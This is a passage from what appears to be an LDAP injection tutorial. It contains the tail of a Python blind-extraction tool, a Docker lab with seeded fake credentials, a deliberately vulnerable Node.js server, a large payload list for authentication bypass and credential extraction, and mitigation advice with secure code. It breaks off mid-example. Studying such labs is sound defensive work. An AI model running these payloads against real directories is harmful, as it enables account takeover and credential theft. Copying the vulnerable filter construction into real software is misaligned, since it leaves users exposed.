            # Use ? wildcard for exact character count
            wildcards = "?" * length
            payload = self.pattern['username'].format(
                username=target_user,
                attribute=attribute,
                test_value=wildcards
            )
            # Replace trailing * from pattern
            payload = payload.replace(f"{wildcards}*", wildcards)

            resp = self.send_payload(payload, 'anything')
            if resp and self.is_match(resp):
                print(f"  [+] '{attribute}' length: {length}")
                return length

            time.sleep(0.03)

        print(f"  [-] Could not determine exact length")
        return None

    def enumerate_attributes(self, target_user):
        """Check which attributes exist for a user"""
        print(f"\n[*] Enumerating attributes for '{target_user}'...")

        common_attributes = [
            'uid', 'cn', 'sn', 'givenName', 'mail', 'userPassword',
            'telephoneNumber', 'description', 'title', 'department',
            'employeeNumber', 'manager', 'memberOf', 'homeDirectory',
            'loginShell', 'sshPublicKey', 'userCertificate',
            'displayName', 'info', 'comment', 'gecos',
            # AD specific
            'sAMAccountName', 'userPrincipalName', 'adminCount',
            'servicePrincipalName', 'msDS-AllowedToDelegateTo',
            'pwdLastSet', 'lastLogon', 'logonCount',
            'userAccountControl', 'objectSid', 'primaryGroupID',
            # Custom/sensitive
            'apiKey', 'secretKey', 'token', 'password',
            'notes', 'internalNotes', 'salary', 'ssn',
        ]

        found_attributes = []

        for attr in common_attributes:
            payload = self.pattern['username'].format(
                username=target_user,
                attribute=attr,
                test_value=""
            )
            # The wildcard * after empty test_value matches any value = attribute exists

            resp = self.send_payload(payload, 'anything')

            if resp and self.is_match(resp):
                found_attributes.append(attr)
                print(f"    [+] {attr}: EXISTS")
            
            time.sleep(0.05)

        print(f"\n  [*] Found {len(found_attributes)} attributes: {found_attributes}")
        return found_attributes

    def full_extraction(self, target_user='admin'):
        """Complete extraction — enumerate then extract all attributes"""
        if not self.calibrate():
            print("[-] Calibration failed. Aborting.")
            return {}

        # Enumerate attributes
        attributes = self.enumerate_attributes(target_user)

        # Extract values for sensitive attributes
        sensitive = ['userPassword', 'description', 'mail', 'telephoneNumber',
                    'title', 'department', 'memberOf', 'sshPublicKey',
                    'apiKey', 'secretKey', 'notes', 'salary',
                    'sAMAccountName', 'servicePrincipalName']

        extracted = {'username': target_user}

        for attr in attributes:
            if attr in sensitive:
                value = self.extract_attribute(target_user, attr)
                if value:
                    extracted[attr] = value

        # Save results
        with open('ldap_extracted_data.json', 'w') as f:
            json.dump(extracted, f, indent=2)

        print(f"\n{'='*60}")
        print(f" EXTRACTION COMPLETE — {target_user}")
        print(f"{'='*60}")
        for k, v in extracted.items():
            print(f"  {k}: {v}")
        print(f"\n  Total requests: {self.request_count}")
        print(f"  Data saved to: ldap_extracted_data.json")
        print(f"{'='*60}")

        return extracted


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <login_url> [target_user] [filter_pattern]")
        print(f"Patterns: and_uid, and_sam, or_filter, null_byte")
        print(f"Example: {sys.argv[0]} https://target.com/login admin and_uid")
        sys.exit(1)

    user = sys.argv[2] if len(sys.argv) > 2 else 'admin'
    pattern = sys.argv[3] if len(sys.argv) > 3 else 'and_uid'

    extractor = LDAPBlindExtractor(
        sys.argv[1],
        filter_pattern=pattern
    )
    extractor.full_extraction(user)
```

::

---

## Vulnerable Lab — Docker Compose

::code-collapse

```yaml [docker-compose.yml]
version: '3.8'

services:
  # Vulnerable web application
  ldap-app:
    build:
      context: ./ldap-app
      dockerfile: Dockerfile
    ports:
      - "8080:3000"
    environment:
      - LDAP_URL=ldap://openldap:389
      - LDAP_BASE_DN=dc=target,dc=com
      - LDAP_BIND_DN=cn=admin,dc=target,dc=com
      - LDAP_BIND_PASSWORD=admin_password
      - NODE_ENV=development
    depends_on:
      openldap:
        condition: service_healthy
    networks:
      - lab-net
    restart: unless-stopped

  # OpenLDAP server
  openldap:
    image: osixia/openldap:1.5.0
    ports:
      - "389:389"
      - "636:636"
    environment:
      LDAP_ORGANISATION: "Target Corp"
      LDAP_DOMAIN: "target.com"
      LDAP_BASE_DN: "dc=target,dc=com"
      LDAP_ADMIN_PASSWORD: "admin_password"
      LDAP_CONFIG_PASSWORD: "config_password"
      LDAP_READONLY_USER: "true"
      LDAP_READONLY_USER_USERNAME: "readonly"
      LDAP_READONLY_USER_PASSWORD: "readonly_pass"
      LDAP_TLS: "false"
    volumes:
      - ldap-data:/var/lib/ldap
      - ldap-config:/etc/ldap/slapd.d
      - ./ldap-seed.ldif:/container/service/slapd/assets/config/bootstrap/ldif/custom/50-users.ldif
    command: --copy-service
    healthcheck:
      test: ldapsearch -x -H ldap://localhost -b "dc=target,dc=com" -D "cn=admin,dc=target,dc=com" -w admin_password "(objectClass=organization)" | grep -q "target"
      interval: 10s
      timeout: 5s
      retries: 10
    networks:
      - lab-net

  # phpLDAPadmin — LDAP GUI
  phpldapadmin:
    image: osixia/phpldapadmin:0.9.0
    ports:
      - "8081:80"
    environment:
      PHPLDAPADMIN_LDAP_HOSTS: openldap
      PHPLDAPADMIN_HTTPS: "false"
    depends_on:
      - openldap
    networks:
      - lab-net

  # Request proxy
  mitmproxy:
    image: mitmproxy/mitmproxy:latest
    ports:
      - "9090:8080"
      - "9091:8081"
    command: mitmweb --web-host 0.0.0.0 --listen-port 8080 --web-port 8081
    networks:
      - lab-net

volumes:
  ldap-data:
  ldap-config:

networks:
  lab-net:
    driver: bridge
```

::

::code-collapse

```ldif [ldap-seed.ldif]
# LDAP Injection Lab — Seed Data
# Users, Groups, and Service Accounts

# Organizational Units
dn: ou=People,dc=target,dc=com
objectClass: organizationalUnit
ou: People
description: User accounts

dn: ou=Groups,dc=target,dc=com
objectClass: organizationalUnit
ou: Groups
description: Group definitions

dn: ou=Services,dc=target,dc=com
objectClass: organizationalUnit
ou: Services
description: Service accounts

dn: ou=IT,ou=People,dc=target,dc=com
objectClass: organizationalUnit
ou: IT
description: IT Department

dn: ou=Finance,ou=People,dc=target,dc=com
objectClass: organizationalUnit
ou: Finance
description: Finance Department

dn: ou=Executive,ou=People,dc=target,dc=com
objectClass: organizationalUnit
ou: Executive
description: Executive Team

# Users
dn: uid=admin,ou=People,dc=target,dc=com
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: admin
cn: System Administrator
sn: Administrator
givenName: System
mail: admin@target.com
userPassword: SuperS3cret@dm1n!
telephoneNumber: +1-555-0100
title: System Administrator
department: IT
employeeNumber: EMP001
description: Master admin account — Password: SuperS3cret@dm1n!
uidNumber: 1000
gidNumber: 1000
homeDirectory: /home/admin
loginShell: /bin/bash

dn: uid=john,ou=IT,ou=People,dc=target,dc=com
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: john
cn: John Doe
sn: Doe
givenName: John
mail: john@target.com
userPassword: john_password_456
telephoneNumber: +1-555-0101
title: Senior Developer
department: Engineering
employeeNumber: EMP042
uidNumber: 1001
gidNumber: 1001
homeDirectory: /home/john
loginShell: /bin/bash

dn: uid=jane,ou=IT,ou=People,dc=target,dc=com
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: jane
cn: Jane Smith
sn: Smith
givenName: Jane
mail: jane@target.com
userPassword: jane_secure_789
telephoneNumber: +1-555-0102
title: DevOps Engineer
department: Engineering
employeeNumber: EMP058
description: VPN access approved 2024-01
uidNumber: 1002
gidNumber: 1002
homeDirectory: /home/jane
loginShell: /bin/bash

dn: uid=bob,ou=Finance,ou=People,dc=target,dc=com
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: bob
cn: Bob Wilson
sn: Wilson
givenName: Bob
mail: bob@target.com
userPassword: b0b_W1ls0n!
telephoneNumber: +1-555-0103
title: Financial Analyst
department: Finance
employeeNumber: EMP073
uidNumber: 1003
gidNumber: 1003
homeDirectory: /home/bob
loginShell: /bin/bash

dn: uid=alice,ou=Executive,ou=People,dc=target,dc=com
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: alice
cn: Alice Jones
sn: Jones
givenName: Alice
mail: alice@target.com
userPassword: al1ce_CEO_2024!
telephoneNumber: +1-555-0104
title: Chief Executive Officer
department: Executive
employeeNumber: EMP001
description: CEO — has access to all systems
uidNumber: 1004
gidNumber: 1004
homeDirectory: /home/alice
loginShell: /bin/bash

dn: uid=svc_backup,ou=Services,dc=target,dc=com
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: svc_backup
cn: Backup Service Account
sn: Service
givenName: Backup
mail: svc_backup@internal.target.com
userPassword: Backup_Svc_K3y!@#2024
title: Service Account
department: IT
employeeNumber: SVC001
description: Backup service — Password: Backup_Svc_K3y!@#2024 — DO NOT CHANGE
uidNumber: 2001
gidNumber: 2001
homeDirectory: /home/svc_backup
loginShell: /sbin/nologin

dn: uid=svc_ldap,ou=Services,dc=target,dc=com
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: svc_ldap
cn: LDAP Service Account
sn: Service
givenName: LDAP
mail: svc_ldap@internal.target.com
userPassword: LDAP_Bind_P@ss_Int3rnal!
title: Service Account
department: IT
employeeNumber: SVC002
description: LDAP bind account for applications
uidNumber: 2002
gidNumber: 2002
homeDirectory: /home/svc_ldap
loginShell: /sbin/nologin

dn: uid=svc_vpn,ou=Services,dc=target,dc=com
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: svc_vpn
cn: VPN Service Account
sn: Service
givenName: VPN
mail: svc_vpn@internal.target.com
userPassword: VPN_Auth_Secret_789
title: Service Account
department: IT
employeeNumber: SVC003
description: VPN authentication service account
uidNumber: 2003
gidNumber: 2003
homeDirectory: /home/svc_vpn
loginShell: /sbin/nologin

# Groups
dn: cn=admins,ou=Groups,dc=target,dc=com
objectClass: groupOfNames
cn: admins
description: System administrators
member: uid=admin,ou=People,dc=target,dc=com

dn: cn=developers,ou=Groups,dc=target,dc=com
objectClass: groupOfNames
cn: developers
description: Development team
member: uid=john,ou=IT,ou=People,dc=target,dc=com
member: uid=jane,ou=IT,ou=People,dc=target,dc=com

dn: cn=finance,ou=Groups,dc=target,dc=com
objectClass: groupOfNames
cn: finance
description: Finance department
member: uid=bob,ou=Finance,ou=People,dc=target,dc=com

dn: cn=executives,ou=Groups,dc=target,dc=com
objectClass: groupOfNames
cn: executives
description: Executive team
member: uid=alice,ou=Executive,ou=People,dc=target,dc=com

dn: cn=vpn-access,ou=Groups,dc=target,dc=com
objectClass: groupOfNames
cn: vpn-access
description: VPN access group
member: uid=admin,ou=People,dc=target,dc=com
member: uid=john,ou=IT,ou=People,dc=target,dc=com
member: uid=jane,ou=IT,ou=People,dc=target,dc=com
member: uid=alice,ou=Executive,ou=People,dc=target,dc=com

dn: cn=ssh-access,ou=Groups,dc=target,dc=com
objectClass: groupOfNames
cn: ssh-access
description: SSH access to production servers
member: uid=admin,ou=People,dc=target,dc=com
member: uid=jane,ou=IT,ou=People,dc=target,dc=com

dn: cn=database-access,ou=Groups,dc=target,dc=com
objectClass: groupOfNames
cn: database-access
description: Production database access
member: uid=admin,ou=People,dc=target,dc=com
member: uid=svc_backup,ou=Services,dc=target,dc=com
```

::

::code-collapse

```javascript [ldap-app/server.js]
/**
 * VULNERABLE LDAP APPLICATION — Lab Server
 * This application is intentionally vulnerable to LDAP injection
 * FOR EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY
 */

const express = require('express');
const ldap = require('ldapjs');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const LDAP_URL = process.env.LDAP_URL || 'ldap://localhost:389';
const BASE_DN = process.env.LDAP_BASE_DN || 'dc=target,dc=com';
const BIND_DN = process.env.LDAP_BIND_DN || 'cn=admin,dc=target,dc=com';
const BIND_PASS = process.env.LDAP_BIND_PASSWORD || 'admin_password';

function getLDAPClient() {
  return new Promise((resolve, reject) => {
    const client = ldap.createClient({ url: LDAP_URL });
    client.bind(BIND_DN, BIND_PASS, (err) => {
      if (err) reject(err);
      else resolve(client);
    });
  });
}

function ldapSearch(client, filter, attributes = []) {
  return new Promise((resolve, reject) => {
    const opts = {
      filter: filter,
      scope: 'sub',
      attributes: attributes.length > 0 ? attributes : undefined
    };

    const entries = [];
    client.search(BASE_DN, opts, (err, res) => {
      if (err) return reject(err);

      res.on('searchEntry', (entry) => {
        const obj = {};
        entry.attributes.forEach(attr => {
          obj[attr.type] = attr.values.length === 1 ? attr.values[0] : attr.values;
        });
        obj.dn = entry.objectName;
        entries.push(obj);
      });

      res.on('error', (err) => reject(err));
      res.on('end', () => resolve(entries));
    });
  });
}

// ===== VULNERABLE ENDPOINTS =====

// 1. Login — LDAP Injection in authentication
app.post('/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    const client = await getLDAPClient();

    // VULNERABLE — Direct string concatenation in LDAP filter
    const filter = `(&(uid=${username})(userPassword=${password}))`;

    console.log(`[LDAP] Filter: ${filter}`);

    const results = await ldapSearch(client, filter);
    client.unbind();

    if (results.length > 0) {
      const user = results[0];
      res.json({
        success: true,
        message: 'Login successful',
        user: {
          uid: user.uid,
          cn: user.cn,
          mail: user.mail,
          title: user.title,
          department: user.department,
          description: user.description,
          memberOf: user.memberOf
        }
      });
    } else {
      res.status(401).json({
        success: false,
        message: 'Invalid credentials'
      });
    }
  } catch (err) {
    // VULNERABLE — Error messages exposed
    res.status(500).json({
      success: false,
      error: err.message,
      filter: err.filter || 'N/A'
    });
  }
});

// 2. User search — LDAP Injection in search
app.get('/search', async (req, res) => {
  try {
    const { q, field } = req.query;
    const searchField = field || 'cn';
    const client = await getLDAPClient();

    // VULNERABLE — User input in search filter
    const filter = `(${searchField}=*${q}*)`;

    console.log(`[LDAP] Search filter: ${filter}`);

    const results = await ldapSearch(client, filter,
      ['uid', 'cn', 'mail', 'title', 'department', 'telephoneNumber']);
    client.unbind();

    res.json({
      query: q,
      field: searchField,
      count: results.length,
      results: results
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 3. User lookup — LDAP Injection in direct lookup
app.get('/user/:uid', async (req, res) => {
  try {
    const { uid } = req.params;
    const client = await getLDAPClient();

    // VULNERABLE — Direct injection in uid lookup
    const filter = `(uid=${uid})`;

    console.log(`[LDAP] Lookup filter: ${filter}`);

    const results = await ldapSearch(client, filter);
    client.unbind();

    if (results.length > 0) {
      res.json(results[0]);
    } else {
      res.status(404).json({ error: 'User not found' });
    }
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 4. Group check — LDAP Injection in authorization
app.post('/check-access', async (req, res) => {
  try {
    const { username, group } = req.body;
    const client = await getLDAPClient();

    // VULNERABLE — Both parameters injectable
    const filter = `(&(uid=${username})(memberOf=cn=${group},ou=Groups,${BASE_DN}))`;

    console.log(`[LDAP] Access filter: ${filter}`);

    const results = await ldapSearch(client, filter);
    client.unbind();

    res.json({
      hasAccess: results.length > 0,
      user: username,
      group: group
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 5. Password change — LDAP Injection in password update
app.post('/change-password', async (req, res) => {
  try {
    const { username, oldPassword, newPassword } = req.body;
    const client = await getLDAPClient();

    // VULNERABLE — Injection in verification filter
    const verifyFilter = `(&(uid=${username})(userPassword=${oldPassword}))`;

    console.log(`[LDAP] Verify filter: ${verifyFilter}`);

    const results = await ldapSearch(client, verifyFilter);

    if (results.length > 0) {
      // In a real app, would modify password here
      res.json({ success: true, message: 'Password changed successfully' });
    } else {
      res.status(401).json({ success: false, message: 'Invalid current credentials' });
    }

    client.unbind();
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ===== SECURE ENDPOINT EXAMPLE =====
app.post('/secure-login', async (req, res) => {
  try {
    const { username, password } = req.body;

    // SECURE — Input validation
    if (typeof username !== 'string' || typeof password !== 'string') {
      return res.status(400).json({ error: 'Invalid input types' });
    }

    // SECURE — Escape LDAP special characters
    const escapeLDAP = (str) => {
      return str.replace(/[\\*()\x00]/g, (char) => {
        return '\\' + char.charCodeAt(0).toString(16).padStart(2, '0');
      });
    };

    const safeUser = escapeLDAP(username);
    const safePass = escapeLDAP(password);

    const client = await getLDAPClient();
    const filter = `(&(uid=${safeUser})(userPassword=${safePass}))`;

    const results = await ldapSearch(client, filter,
      ['uid', 'cn', 'mail']);
    client.unbind();

    if (results.length > 0) {
      res.json({ success: true, user: { uid: results[0].uid } });
    } else {
      res.status(401).json({ success: false });
    }
  } catch (err) {
    // SECURE — Generic error message
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Lab info
app.get('/', (req, res) => {
  res.json({
    lab: 'LDAP Injection Lab',
    backend: 'OpenLDAP',
    endpoints: [
      'POST /login — Auth bypass (username & password injection)',
      'GET  /search?q=INPUT&field=ATTR — Search injection',
      'GET  /user/:uid — Lookup injection',
      'POST /check-access — Group authorization bypass',
      'POST /change-password — Password change injection',
      'POST /secure-login — Secure example (for comparison)'
    ],
    note: 'This application is intentionally vulnerable. For educational use only.',
    ldap_credentials: {
      admin: 'cn=admin,dc=target,dc=com / admin_password',
      phpldapadmin: 'http://localhost:8081'
    }
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`[*] LDAP Injection Lab running on port ${PORT}`);
  console.log('[!] This server is intentionally vulnerable');
});
```

::

---

## Comprehensive Payload Collection

::code-collapse

```text [ldap_injection_payloads.txt]
# =====================================================
# LDAP INJECTION — MASTER PAYLOAD COLLECTION
# For authorized penetration testing only
# =====================================================

# ===== AUTHENTICATION BYPASS — USERNAME FIELD =====

# Always-true injections (AND filter)
admin)(&))
admin)(|(uid=*))
admin)(!(&(1=0)))
admin)(objectClass=*))(&)(|
admin)(uid=admin))(&)(|
admin)(uid=*))(&)(|
*)(&))
*
*)(uid=*))(|(uid=*
admin)(|(objectClass=*
admin))(&(uid=admin
admin)(!(uid=nonexistent)))(&)(|

# Null byte truncation
admin)%00
admin)\00
admin)%2500
admin)\x00

# OR filter injections
*)(uid=*))(|(uid=*
admin)(|(uid=admin
*)(|(objectClass=*

# ===== AUTHENTICATION BYPASS — PASSWORD FIELD =====

*)(&
*
*)(!(&(1=0
*)(uid=*))(|(uid=*
anything)(&))
anything)(|(uid=*))
*)%00

# ===== BOTH FIELDS =====
# Username: *    Password: *
# Username: *)(uid=*    Password: *)(userPassword=*

# ===== ACTIVE DIRECTORY SPECIFIC =====
admin)(&))
*)(sAMAccountName=admin))(&)(|
*)(memberOf=CN=Domain Admins,CN=Users,DC=target,DC=com))(&)(|
*)(adminCount=1))(&)(|
*)(servicePrincipalName=*))(&)(|
*)(userAccountControl:1.2.840.113556.1.4.803:=524288))(&)(|
*)(userAccountControl:1.2.840.113556.1.4.803:=4194304))(&)(|
*)(ms-Mcs-AdmPwd=*))(&)(|

# ===== DATA EXTRACTION =====

# User enumeration
*)(objectClass=person)(|(uid=*
*)(objectClass=inetOrgPerson)(|(uid=*
*)(objectClass=user)(|(sAMAccountName=*

# Group enumeration
*)(objectClass=groupOfNames)(|(cn=*
*)(objectClass=group)(|(cn=*

# Computer enumeration
*)(objectClass=computer)(|(cn=*

# OU enumeration
*)(objectClass=organizationalUnit)(|(ou=*

# Service account discovery
*)(uid=svc_*)(|(uid=*
*)(uid=service_*)(|(uid=*
*)(uid=sa_*)(|(uid=*

# Credential hunting in descriptions
*)(description=*password*)(|(uid=*
*)(description=*pwd*)(|(uid=*
*)(description=*secret*)(|(uid=*
*)(description=*key*)(|(uid=*
*)(description=*cred*)(|(uid=*
*)(description=*pass:*)(|(uid=*
*)(description=*initial*)(|(uid=*
*)(info=*password*)(|(uid=*
*)(comment=*)(|(uid=*

# Attribute existence check
admin)(mail=*))(&)(|
admin)(telephoneNumber=*))(&)(|
admin)(sshPublicKey=*))(&)(|
admin)(description=*))(&)(|
admin)(memberOf=*))(&)(|
admin)(title=*))(&)(|
admin)(department=*))(&)(|
admin)(employeeNumber=*))(&)(|

# ===== BLIND EXTRACTION — CHARACTER BY CHARACTER =====

# Password starts with 'a'?
admin)(userPassword=a*))(&)(|
# Password starts with 'S'?
admin)(userPassword=S*))(&)(|
# Password starts with 'Se'?
admin)(userPassword=Se*))(&)(|
# Continue...

# Password length detection
admin)(userPassword=?))(&)(|          # 1 char
admin)(userPassword=??))(&)(|         # 2 chars
admin)(userPassword=???))(&)(|        # 3 chars
admin)(userPassword=????????))(&)(|   # 8 chars

# ===== GROUP MEMBERSHIP EXTRACTION =====
*)(memberOf=cn=admins,ou=Groups,dc=target,dc=com)(|(uid=*
*)(memberOf=cn=vpn-access,ou=Groups,dc=target,dc=com)(|(uid=*
*)(memberOf=cn=ssh-access,ou=Groups,dc=target,dc=com)(|(uid=*
*)(memberOf=cn=database-access,ou=Groups,dc=target,dc=com)(|(uid=*
*)(memberOf=cn=developers,ou=Groups,dc=target,dc=com)(|(uid=*

# ===== WILDCARD ENUMERATION =====
a*
b*
c*
...
z*
admin*
svc_*
test*
backup*
service*

# ===== ENCODING BYPASS =====
# URL encoded
admin%29%28%26%29%29
%2a
%28%26%29

# Double encoded
admin%2529%2528%2526%2529%2529
%252a

# LDAP hex escaped
admin\29\28&\29\29
\2a

# ===== ERROR TRIGGERING =====
)
)(
))
((
\
)()(
*)(objectClass=*
x]([!(objectClass=*
)(|
&)(|)(
!(uid=*
```

::

---

## Attack Flow Diagram

```text [LDAP Injection — Complete Attack Flow]
┌─────────────┐         ┌──────────────────┐         ┌─────────────┐
│   ATTACKER  │         │  VULNERABLE APP  │         │ LDAP SERVER │
└──────┬──────┘         └────────┬─────────┘         └──────┬──────┘
       │                         │                          │
       │ 1. POST /login          │                          │
       │ user: admin)(&))        │                          │
       │ pass: anything          │                          │
       │ ────────────────────►   │                          │
       │                         │                          │
       │                         │ 2. Build LDAP filter:    │
       │                         │ (&(uid=admin)(&))        │
       │                         │ (userPassword=anything)) │
       │                         │                          │
       │                         │ 3. LDAP Search           │
       │                         │ Filter: (&(uid=admin)    │
       │                         │         (&))             │
       │                         │ ─────────────────────►   │
       │                         │                          │
       │                         │    (&) is ALWAYS TRUE    │
       │                         │    Password check is     │
       │                         │    outside the filter    │
       │                         │                          │
       │                         │ 4. Returns admin entry   │
       │                         │ ◄─────────────────────   │
       │                         │                          │
       │ 5. Login successful!    │                          │
       │ Returns admin data      │                          │
       │ ◄────────────────────   │                          │
       │                         │                          │
       │ 6. Extract more data    │                          │
       │ via blind injection     │                          │
       │                         │                          │
       │ user: admin)(password   │                          │
       │       =S*))(&)(|        │                          │
       │ ────────────────────►   │                          │
       │                         │ 7. LDAP Search           │
       │                         │ (&(uid=admin)            │
       │                         │  (password=S*))(&)(|     │
       │                         │  (pass=anything))        │
       │                         │ ─────────────────────►   │
       │                         │                          │
       │                         │ 8. Match! (password      │
       │                         │    starts with 'S')      │
       │                         │ ◄─────────────────────   │
       │                         │                          │
       │ 9. Success response     │                          │
       │ (confirms 'S' prefix)   │                          │
       │ ◄────────────────────   │                          │
       │                         │                          │
       │ 10. Continue char-by-   │                          │
       │     char extraction...  │                          │
       │     Se → Sec → Secr     │                          │
       │     → Secret → ...      │                          │
       │                         │                          │
       │ ╔═══════════════════╗   │                          │
       │ ║ PASSWORD EXTRACTED║   │                          │
       │ ║ admin: Secret123! ║   │                          │
       │ ╚═══════════════════╝   │                          │
```

---

## Mitigation & Prevention

::card-group
  ::card
  ---
  title: Escape LDAP Special Characters
  icon: i-lucide-shield-check
  ---
  **Always** escape LDAP metacharacters (`*`, `(`, `)`, `\`, `NUL`, `/`) in user input before incorporating into filters. Use framework-provided escaping functions — never build filters via string concatenation.
  ::

  ::card
  ---
  title: Input Validation & Allowlisting
  icon: i-lucide-check-circle
  ---
  Validate user input against strict allowlists. Usernames should only contain `[a-zA-Z0-9._-]`. Reject any input containing LDAP special characters, parentheses, or operator symbols.
  ::

  ::card
  ---
  title: Parameterized LDAP Queries
  icon: i-lucide-code
  ---
  Use LDAP libraries that support parameterized filters or template-based filter construction. Avoid string concatenation for filter building. Most modern LDAP SDKs provide safe filter construction methods.
  ::

  ::card
  ---
  title: Principle of Least Privilege
  icon: i-lucide-user-minus
  ---
  Application LDAP bind accounts should have **read-only access** to only the attributes needed. Never use the LDAP admin account for application queries. Restrict access to sensitive attributes like `userPassword`.
  ::

  ::card
  ---
  title: LDAP Access Controls
  icon: i-lucide-lock
  ---
  Configure LDAP ACLs to prevent anonymous queries and restrict which attributes each bind account can read. Sensitive attributes (`userPassword`, `description`) should not be readable by application accounts.
  ::

  ::card
  ---
  title: Error Handling
  icon: i-lucide-alert-circle
  ---
  Never expose LDAP error messages, filter syntax, or directory structure to users. Return generic "Invalid credentials" for all auth failures. Log detailed errors server-side only.
  ::
::

### Secure Code Examples

::code-group
```javascript [Node.js — Secure LDAP Filter]
const ldap = require('ldapjs');

// SECURE — Escape LDAP special characters
function escapeLDAPFilter(input) {
  if (typeof input !== 'string') {
    throw new Error('Input must be a string');
  }
  
  return input
    .replace(/\\/g, '\\5c')
    .replace(/\*/g, '\\2a')
    .replace(/\(/g, '\\28')
    .replace(/\)/g, '\\29')
    .replace(/\x00/g, '\\00')
    .replace(/\//g, '\\2f');
}

// SECURE — Validate input format
function validateUsername(username) {
  if (typeof username !== 'string') return false;
  if (username.length < 1 || username.length > 100) return false;
  return /^[a-zA-Z0-9._-]+$/.test(username);
}

app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  // SECURE — Type and format validation
  if (!validateUsername(username) || typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid input' });
  }
  
  // SECURE — Escape before filter construction
  const safeUser = escapeLDAPFilter(username);
  const safePass = escapeLDAPFilter(password);
  
  // SECURE — Or use ldapjs built-in filter
  const filter = new ldap.filters.AndFilter({
    filters: [
      new ldap.filters.EqualityFilter({ attribute: 'uid', value: safeUser }),
      new ldap.filters.EqualityFilter({ attribute: 'userPassword', value: safePass })
    ]
  });
  
  // Even better: BIND authentication (don't search for password)
  // client.bind(userDN, password, callback)
});
```

```python [Python — Secure LDAP]
import ldap
import re

def escape_ldap_filter(value):
    """Escape LDAP filter special characters"""
    if not isinstance(value, str):
        raise ValueError("Input must be a string")
    
    # RFC 4515 escaping
    return (value
        .replace('\\', '\\5c')
        .replace('*', '\\2a')
        .replace('(', '\\28')
        .replace(')', '\\29')
        .replace('\x00', '\\00'))

def validate_username(username):
    """Validate username format"""
    if not isinstance(username, str):
        return False
    if not 1 <= len(username) <= 100:
        return False
    return bool(re.match(r'^[a-zA-Z0-9._-]+$', username))

def secure_login(username, password):
    # Validate input
    if not validate_username(username):
        raise ValueError("Invalid username format")
    
    # Method 1: Escape and search
    safe_user = escape_ldap_filter(username)
    safe_pass = escape_ldap_filter(password)
    filter_str = f"(&(uid={safe_user})(userPassword={safe_pass}))"
    
    # Method 2 (BETTER): Use LDAP BIND authentication
    user_dn = f"uid={safe_user},ou=People,dc=target,dc=com"
    conn = ldap.initialize('ldap://ldapserver:389')
    try:
        conn.simple_bind_s(user_dn, password)
        return True  # Bind succeeded = correct credentials
    except ldap.INVALID_CREDENTIALS:
        return False
    finally:
        conn.unbind_s()
```

```java [Java — Secure JNDI/LDAP]
import javax.naming.directory.*;
import javax.naming.ldap.*;

public class SecureLDAPAuth {
    
    // SECURE — Escape LDAP filter special characters
    public static String escapeLDAPFilter(String input) {
        if (input == null) return "";
        
        StringBuilder sb = new StringBuilder();
        for (char c : input.toCharArray()) {
            switch (c) {
                case '\\': sb.append("\\5c"); break;
                case '*':  sb.append("\\2a"); break;
                case '(':  sb.append("\\28"); break;
                case ')':  sb.append("\\29"); break;
                case '\0': sb.append("\\00"); break;
                default:   sb.append(c);
            }
        }
        return sb.toString();
    }
    
    // SECURE — Validate input
    public static boolean validateUsername(String username) {
        return username != null 
            && username.length() >= 1 
            && username.length() <= 100
            && username.matches("^[a-zA-Z0-9._-]+$");
    }
    
    // SECURE — BIND authentication (recommended)
    public static boolean authenticate(String username, String password) {
        if (!validateUsername(username)) return false;
        
        String userDN = "uid=" + escapeLDAPFilter(username) 
                      + ",ou=People,dc=target,dc=com";
        
        Hashtable<String, String> env = new Hashtable<>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
        env.put(Context.PROVIDER_URL, "ldap://ldapserver:389");
        env.put(Context.SECURITY_AUTHENTICATION, "simple");
        env.put(Context.SECURITY_PRINCIPAL, userDN);
        env.put(Context.SECURITY_CREDENTIALS, password);
        
        try {
            DirContext ctx = new InitialDirContext(env);
            ctx.close();
            return true;  // Bind succeeded
        } catch (AuthenticationException e) {
            return false;  // Invalid credentials
        } catch (NamingException e) {
            throw new RuntimeException("LDAP error", e);
        }
    }
}
```

```php [PHP — Secure LDAP]
<?php
// SECURE — Escape LDAP filter characters
function escapeLDAPFilter($value) {
    if (!is_string($value)) {
        throw new InvalidArgumentException('Input must be a string');
    }
    
    // Use PHP's built-in function (PHP 5.6+)
    return ldap_escape($value, '', LDAP_ESCAPE_FILTER);
}

// SECURE — Escape DN characters
function escapeLDAPDN($value) {
    return ldap_escape($value, '', LDAP_ESCAPE_DN);
}

// SECURE — Validate username
function validateUsername($username) {
    return is_string($username) 
        && strlen($username) >= 1 
        && strlen($username) <= 100
        && preg_match('/^[a-zA-Z0-9._-]+$/', $username);
}

// SECURE — BIND authentication (recommended)
function secureLDAPLogin($username, $password) {
    if (!validateUsername($username)) {
        return false;
    }
    
    $conn = ldap_connect('ldap://ldapserver:389');
    ldap_set_option($conn, LDAP_OPT_PROTOCOL_VERSION, 3);
    
    $userDN = "uid=" . escapeLDAPDN($username) 
            . ",ou=People,dc=target,dc=com";
    
    // BIND as the user — LDAP server validates credentials
    $bind = @ldap_bind($conn, $userDN, $password);
    
    ldap_unbind($conn);
    return $bind;
}
?>
```

```csharp [C# — Secure LDAP]
using System.DirectoryServices.Protocols;

public class SecureLDAPAuth
{
    // SECURE — Escape LDAP filter
